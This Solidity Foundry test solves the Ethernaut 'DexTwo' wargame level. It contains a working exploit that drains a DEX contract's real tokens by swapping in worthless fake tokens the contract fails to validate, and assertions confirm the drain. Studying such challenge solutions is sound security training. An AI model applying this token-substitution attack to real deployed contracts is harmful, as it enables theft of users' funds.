// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;
pragma experimental ABIEncoderV2;

import "lib/forge-std/src/BaseTest.sol";
import {DexTwoFactory, DexTwo, SwappableTokenTwo} from "src/levels/23-DexTwo/DexTwoFactory.sol";
// import {DexAttack} from "src/levels/22-Dex/DexAttack.sol";

import "src/utilities/ERC20-08.sol";

contract TestDexTwo is BaseTest {
    DexTwo private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = DexTwo(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(
            token1.balanceOf(address(level)) == 100 &&
                token2.balanceOf(address(level)) == 100,
            true
        );
        assertEq(
            token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10,
            true
        );
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // 1. Attacker creates his own two ERC20 tokens and mint himself (`msg.sender`) 10 `fakeToken1` and 10 `fakeToken2`.
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(
            address(level),
            "Fake Token1",
            "FT1",
            10
        );

        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(
            address(level),
            "Fake Token2",
            "FT1",
            10
        );
        emit log_named_uint(
            "Balance of token1 before attack",
            level.balanceOf(address(token1), address(level))
        );
        emit log_named_uint(
            "Balance of token2 before attack",
            level.balanceOf(address(token2), address(level))
        );

        // 2. Attacker approves the `DexTwo` to spend 1 of his `fakeToken1` and 1 of his `fakeToken2`.
        fakeToken1.approve(address(level), 10);
        fakeToken2.approve(address(level), 10);

        // 3. Attacker transfers 1 `fakeToken1` and 1 `fakeToken2` to `DexTwo` contract so that the price ratio is balanced to 1:1 when swapping.
        fakeToken1.transfer(address(level), 1);
        fakeToken2.transfer(address(level), 1);

        // 4. Attacker calls `swap()` function twice (for each token) from `DexTwo` contract.
        level.swap(address(fakeToken1), address(token1), 1);
        level.swap(address(fakeToken2), address(token2), 1);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_uint(
            "Balance of token1 after attack",
            level.balanceOf(address(token1), address(level))
        );
        emit log_named_uint(
            "Balance of token2 before attack",
            level.balanceOf(address(token2), address(level))
        );

        // Assert that we have drained the Dex contract
        assertEq(
            token1.balanceOf(address(level)) == 0 &&
                token2.balanceOf(address(level)) == 0,
            true
        );

        vm.stopPrank();
    }
}
